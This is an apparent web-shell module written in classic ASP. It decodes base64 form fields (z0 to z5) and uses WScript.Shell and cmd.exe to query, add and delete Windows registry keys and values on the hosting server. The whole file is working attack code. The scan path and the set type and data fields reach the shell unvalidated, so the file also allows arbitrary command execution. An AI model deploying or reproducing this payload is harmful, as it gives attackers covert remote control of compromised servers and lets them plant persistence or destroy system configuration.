<%

On Error Resume Next
Server.ScriptTimeout = 9999

Function RunReg(cmd, ByRef output)
    Dim shell, execObj, line, outList
    Set shell = Server.CreateObject("WScript.Shell")
    Set execObj = shell.Exec("%comspec% /c cmd.exe /u /c " & cmd & " 2>&1")
    
    Set outList = CreateObject("Scripting.Dictionary")
    Dim i : i = 0
    Do While Not execObj.StdOut.AtEndOfStream
        line = execObj.StdOut.ReadLine()
        outList.Add i, line
        i = i + 1
    Loop
    
    output = outList.Items
    RunReg = execObj.ExitCode
    
    Set execObj = Nothing
    Set shell = Nothing
End Function

Function ValidatePath(path)
    Dim regEx
    Set regEx = New RegExp
    regEx.Pattern = "^HKEY_(LOCAL_MACHINE|CURRENT_USER|USERS|CLASSES_ROOT|CURRENT_CONFIG)\\[A-Za-z0-9_\\\-]+$"
    regEx.IgnoreCase = True
    ValidatePath = regEx.Test(path)
End Function

Function ValidateValueName(name)
    Dim regEx
    Set regEx = New RegExp
    regEx.Pattern = "^[A-Za-z0-9 _\-]+$"
    regEx.IgnoreCase = True
    ValidateValueName = regEx.Test(name)
End Function

Function Base64Decode(byVal base64String)
    Dim xml, node
    Set xml = Server.CreateObject("MSXML2.DOMDocument.3.0")
    Set node = xml.CreateElement("b64")
    node.dataType = "bin.base64"
    node.text = base64String
    Base64Decode = Stream_BinaryToString(node.nodeTypedValue, "utf-8")
    Set node = Nothing
    Set xml = Nothing
End Function

Function Base64EncodeString(byVal text)
    Dim xml, node
    Set xml = Server.CreateObject("MSXML2.DOMDocument.3.0")
    Set node = xml.CreateElement("b64")
    node.dataType = "bin.base64"
    node.nodeTypedValue = Stream_StringToBinary(text, "utf-8")
    Base64EncodeString = Replace(node.text, vbLf, "")
    Set node = Nothing
    Set xml = Nothing
End Function

Function Stream_StringToBinary(text, charset)
    Dim stream
    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 2 ' adTypeText
    stream.Charset = charset
    stream.Open
    stream.WriteText text
    stream.Position = 0
    stream.Type = 1 ' adTypeBinary
    Stream_StringToBinary = stream.Read
    stream.Close
    Set stream = Nothing
End Function

Function Stream_BinaryToString(binary, charset)
    Dim stream
    Set stream = Server.CreateObject("ADODB.Stream")
    stream.Type = 1 ' adTypeBinary
    stream.Open
    stream.Write binary
    stream.Position = 0
    stream.Type = 2 ' adTypeText
    stream.Charset = charset
    Stream_BinaryToString = stream.ReadText
    stream.Close
    Set stream = Nothing
End Function

Function CheckHives()
    Dim hives, hive, output, ret, jsonParts
    ' Array of the five standard registry hives
    hives = Array("HKEY_CLASSES_ROOT", "HKEY_CURRENT_USER", "HKEY_LOCAL_MACHINE", "HKEY_USERS", "HKEY_CURRENT_CONFIG")
    
    Dim partsList
    Set partsList = CreateObject("Scripting.Dictionary")
    
    Dim i : i = 0
    For Each hive In hives
        ret = RunReg("reg query """ & hive & """ /v *", output)
        
        If ret = 0 Or ret = 1 Then
            partsList.Add i, """" & hive & """:true"
        Else
            partsList.Add i, """" & hive & """:false"
        End If
        i = i + 1
    Next
    
    ' Join the array to build a clean JSON object structure without trailing commas
    CheckHives = "{" & Join(partsList.Items, ",") & "}"
    Set partsList = Nothing
End Function

Function ScanRegistry(base_path)
    Dim output, ret, json, outLine, i
    Dim regExKey, regExVal, matches, subkeysStr, valuesStr
    
    ret = RunReg("reg query """ & base_path & """", output)
    
    subkeysStr = ""
    valuesStr = ""
    
    If ret <> 0 Then
        ScanRegistry = "{""success"":false,""error"":""Command failed"",""subkeys"":[],""values"":[]}"
        Exit Function
    End If
    
    Set regExKey = New RegExp
    regExKey.Pattern = "^HKEY_"
    
    Set regExVal = New RegExp
    regExVal.Pattern = "^\s*(.*?)\s+(REG_\w+)\s+(.*)$"
    
    Dim firstKeySeen : firstKeySeen = False
    
    For i = 0 To UBound(output)
        outLine = Trim(output(i))
        If outLine <> "" Then
            If regExKey.Test(outLine) Then
                If Not firstKeySeen Then
                    firstKeySeen = True
                Else
                    ' FIX: Escape backslashes for JSON compatibility
                    outLine = Replace(outLine, "\", "\\")
                    subkeysStr = subkeysStr & """" & outLine & ""","
                End If
            ElseIf regExVal.Test(outLine) Then
                Set matches = regExVal.Execute(outLine)
                Dim vName : vName = Trim(matches(0).SubMatches(0))
                Dim vType : vType = Trim(matches(0).SubMatches(1))
                Dim vData : vData = Base64EncodeString(Trim(matches(0).SubMatches(2)))
                
                ' FIX: Escape backslashes in value names too
                vName = Replace(vName, "\", "\\")
                
                valuesStr = valuesStr & "{""name"":""" & vName & """,""type"":""" & vType & """,""data"":""" & vData & """},"
            End If
        End If
    Next
    
    If Right(subkeysStr, 1) = "," Then subkeysStr = Left(subkeysStr, Len(subkeysStr) - 1)
    If Right(valuesStr, 1) = "," Then valuesStr = Left(valuesStr, Len(valuesStr) - 1)
    
    ScanRegistry = "{""success"":true,""error"":null,""subkeys"":[" & subkeysStr & "],""values"":[" & valuesStr & "]}"
End Function

Function SetValue(path, name, rtype, data)
    If Not (ValidatePath(path) And ValidateValueName(name)) Then
        SetValue = "{""success"":false,""error"":""Invalid path or name""}"
        Exit Function
    End If
    
    Dim cmd, output, ret
    cmd = "reg add """ & path & """ /v """ & name & """ /t " & rtype & " /d """ & data & """ /f"
    ret = RunReg(cmd, output)
    
    If ret = 0 Then
        SetValue = "{""success"":true}"
    Else
        SetValue = "{""success"":false}"
    End If
End Function

Function DeleteKey(path)
    If Not ValidatePath(path) Then
        DeleteKey = "{""success"":false,""error"":""Invalid path""}"
        Exit Function
    End If
    Dim output, ret
    ret = RunReg("reg delete """ & path & """ /f", output)
    DeleteKey = "{""success"":" & CBool(ret = 0) & "}"
End Function

Function DeleteValue(path, name)
    If Not (ValidatePath(path) And ValidateValueName(name)) Then
        DeleteValue = "{""success"":false,""error"":""Invalid inputs""}"
        Exit Function
    End If
    Dim output, ret
    ret = RunReg("reg delete """ & path & """ /v """ & name & """ /f", output)
    DeleteValue = "{""success"":true}"
End Function

Response.ContentType = "application/json"
Response.CharSet = "utf-8"

Dim action, z2, z3, z4, z5
action = Base64Decode(Request.Form("z0"))
z1 = Base64Decode(Request.Form("z1"))
z2 = Base64Decode(Request.Form("z2"))
z3 = Base64Decode(Request.Form("z3"))
z4 = Base64Decode(Request.Form("z4"))
z5 = Base64Decode(Request.Form("z5"))

Select Case action
    Case "hive"
        Response.Write CheckHives()
        
    Case "scan"
        Response.Write ScanRegistry(z2)
        
    Case "set", "new_value"
        Response.Write SetValue(z2, z3, z4, z5)
        
    Case "del_key"
        Response.Write DeleteKey(z2)
        
    Case "del_value"
        Response.Write DeleteValue(z2, z3)
        
    Case Else
        Response.Write "{""success"":false,""error"":""Unknown or unhandled action""}"
End Select
%>